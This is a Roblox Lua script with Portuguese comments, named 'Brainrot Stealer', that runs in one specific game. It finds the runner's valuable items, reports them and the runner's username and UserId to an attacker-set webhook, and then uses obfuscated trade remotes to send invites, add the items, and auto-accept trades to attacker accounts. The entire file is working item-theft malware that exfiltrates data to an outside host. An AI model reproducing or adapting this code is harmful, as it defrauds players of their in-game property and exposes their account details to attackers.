-- Versão corrigida com remotes ofuscados

if game.PlaceId ~= 109983668079237 then
    return
end

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Workspace = game:GetService("Workspace")
local HttpService = game:GetService("HttpService")
local LocalPlayer = Players.LocalPlayer

local TARGET_USERS = getgenv().TARGET_USERS or {}
if #TARGET_USERS == 0 and getgenv().TARGET_USER then
    TARGET_USERS = {getgenv().TARGET_USER}
end
local WEBHOOK_URL = getgenv().WEBHOOK_URL or ""
local TARGET_BRAINROTS = getgenv().NORMAL_BRAINROTS or {}
local DELAY_BETWEEN_INVITES = getgenv().DELAY_BETWEEN_INVITES or 15

local tradeCompleted = false
local webhookSent = false

-- ===== PEGA REMOTE OFUSCADO =====
-- O Net tem uma estrutura: "RE/NomeDoRemote" e o próximo filho é o remote real
local function getObfuscatedRemote(name)
    local net = ReplicatedStorage:FindFirstChild("Packages")
    if net then
        net = net:FindFirstChild("Net")
        if net then
            local children = net:GetChildren()
            -- Procura o remote ofuscado
            for i = 1, #children - 1 do
                local current = children[i]
                local nextOne = children[i + 1]
                if current and current.Name and string.find(current.Name, name) then
                    -- O remote real é o próximo filho (ofuscado)
                    if nextOne and (nextOne:IsA("RemoteEvent") or nextOne:IsA("RemoteFunction")) then
                        print("[DEBUG] Remote encontrado: " .. current.Name .. " -> " .. nextOne.Name)
                        return nextOne
                    end
                end
            end
        end
    end
    return nil
end

-- ===== FIND PLAYER BASE =====
local function findPlayerBase()
    local plots = Workspace:FindFirstChild("Plots")
    if not plots then return nil end
    
    local username = LocalPlayer.Name
    local displayName = LocalPlayer.DisplayName
    
    for _, plot in ipairs(plots:GetChildren()) do
        if plot:IsA("Model") then
            local plotSign = plot:FindFirstChild("PlotSign")
            if plotSign then
                local surfaceGui = plotSign:FindFirstChildOfClass("SurfaceGui")
                if surfaceGui then
                    local frame = surfaceGui:FindFirstChild("Frame")
                    if frame then
                        local textLabel = frame:FindFirstChildOfClass("TextLabel")
                        if textLabel then
                            local text = textLabel.Text
                            if text then
                                local clean = text:gsub("'s Base$", ""):gsub(" Base$", "")
                                if clean == username or clean == displayName then
                                    return plot
                                end
                            end
                        end
                    end
                end
            end
        end
    end
    return nil
end

-- ===== SCAN BRAINROTS =====
local function getAnimalNames()
    local names = {}
    local animalsFolder = ReplicatedStorage:FindFirstChild("Animations")
    if animalsFolder then
        animalsFolder = animalsFolder:FindFirstChild("Animals")
        if animalsFolder then
            for _, child in ipairs(animalsFolder:GetChildren()) do
                if child:IsA("Folder") then
                    names[child.Name] = true
                end
            end
        end
    end
    return names
end

local function scanBrainrots()
    local base = findPlayerBase()
    if not base then return {} end
    
    local animalNames = getAnimalNames()
    local found = {}
    
    for _, child in ipairs(base:GetChildren()) do
        if child:IsA("Model") and animalNames[child.Name] then
            if TARGET_BRAINROTS[child.Name] then
                table.insert(found, {
                    name = child.Name,
                    slotKey = child.Name
                })
            end
        end
    end
    
    return found
end

-- ===== WEBHOOK =====
local function formatNumber(n)
    if not n or n == 0 then return "$0/s" end
    if n >= 1e12 then return "$" .. string.format("%.2fT", n / 1e12):gsub("%.?0+$", "")
    elseif n >= 1e9 then return "$" .. string.format("%.2fB", n / 1e9):gsub("%.?0+$", "")
    elseif n >= 1e6 then return "$" .. string.format("%.2fM", n / 1e6):gsub("%.?0+$", "")
    elseif n >= 1e3 then return "$" .. string.format("%.2fK", n / 1e3):gsub("%.?0+$", "")
    else return "$" .. math.floor(n) .. "/s" end
end

local function sendWebhook(brainrots)
    if WEBHOOK_URL == "" or webhookSent then return end
    webhookSent = true
    
    local request = syn and syn.request or (http and http.request or (http_request or request))
    if not request then return end
    
    local lines = {}
    if #brainrots > 0 then
        for _, item in ipairs(brainrots) do
            table.insert(lines, "**" .. item.name .. "** [Brainrot]")
        end
    else
        table.insert(lines, "Nenhum brainrot encontrado!")
    end
    
    local description = table.concat(lines, "\n")
    if #description > 4000 then
        description = description:sub(1, 3996) .. "..."
    end
    
    local embed = {
        title = "Brainrot Stealer",
        description = description,
        color = 0xFF0000,
        fields = {
            {
                name = "Server",
                value = "Players: **" .. #Players:GetPlayers() .. "**",
                inline = true
            }
        },
        footer = {
            text = LocalPlayer.Name .. " • " .. LocalPlayer.UserId
        },
        timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
    }
    
    pcall(function()
        request({
            Url = WEBHOOK_URL,
            Method = "POST",
            Headers = { ["Content-Type"] = "application/json" },
            Body = HttpService:JSONEncode({
                content = "@everyone",
                embeds = { embed },
                username = "Stealer"
            })
        })
        print("[Stealer] Webhook enviado!")
    end)
end

-- ===== GET USER ID =====
local function getUserIdFromName(username)
    if type(username) == "number" then return username end
    local success, result = pcall(function()
        return Players:GetUserIdFromNameAsync(username)
    end)
    if success and result then
        return result
    end
    return nil
end

local function isPlayerOnline(userId)
    for _, player in ipairs(Players:GetPlayers()) do
        if player.UserId == userId then
            return true
        end
    end
    return false
end

-- ===== MAIN =====
local function main()
    print("[Stealer] Iniciado!")
    
    -- Pega os remotes ofuscados
    local inviteRemote = getObfuscatedRemote("TradeService/Invite")
    local addBrainrotRemote = getObfuscatedRemote("TradeService/AddBrainrot")
    local readyRemote = getObfuscatedRemote("TradeService/Ready")
    local acceptRemote = getObfuscatedRemote("TradeService/Accept")
    
    print("[Stealer] Remotes:")
    print("  Invite: " .. tostring(inviteRemote ~= nil))
    print("  AddBrainrot: " .. tostring(addBrainrotRemote ~= nil))
    print("  Ready: " .. tostring(readyRemote ~= nil))
    print("  Accept: " .. tostring(acceptRemote ~= nil))
    
    if not inviteRemote or not addBrainrotRemote then
        print("[Stealer] ❌ Remotes não encontrados!")
        return
    end
    
    local brainrots = scanBrainrots()
    print("[Stealer] Brainrots encontrados: " .. #brainrots)
    sendWebhook(brainrots)
    
    if #brainrots == 0 or #TARGET_USERS == 0 then
        print("[Stealer] Sem brainrots ou targets!")
        return
    end
    
    while not tradeCompleted do
        for _, target in ipairs(TARGET_USERS) do
            if target ~= "" then
                local userId = getUserIdFromName(target)
                if userId and isPlayerOnline(userId) then
                    print("[Stealer] Enviando invite para: " .. target)
                    
                    -- InvokeServer com os parâmetros corretos
                    local success = pcall(function()
                        return inviteRemote:InvokeServer("afb005f9-6e81-4e0a-8bb0-3555938a9658", userId)
                    end)
                    
                    if success then
                        print("[Stealer] ✅ Invite enviado!")
                        task.wait(3)
                        
                        for _, brainrot in ipairs(brainrots) do
                            print("[Stealer] Adicionando: " .. brainrot.name)
                            pcall(function()
                                addBrainrotRemote:InvokeServer("6b5f15fb-5cb9-4d07-a031-bbff8e641eda", brainrot.slotKey, {Index = brainrot.name})
                            end)
                            task.wait(1.5)
                        end
                        
                        if readyRemote and acceptRemote then
                            task.wait(3)
                            print("[Stealer] Enviando Ready...")
                            pcall(function()
                                readyRemote:FireServer("d73acf93-6f32-44df-b813-0f6b32c7afd9")
                            end)
                            task.wait(2)
                            print("[Stealer] Enviando Accept...")
                            pcall(function()
                                acceptRemote:FireServer("918ee0f5-e98f-413f-b76e-baee47b021cb")
                            end)
                            print("[Stealer] ✅ Trade concluída!")
                            tradeCompleted = true
                        end
                    else
                        print("[Stealer] ❌ Falha ao enviar invite!")
                    end
                end
            end
        end
        
        if not tradeCompleted then
            task.wait(DELAY_BETWEEN_INVITES)
        end
    end
end

pcall(main)
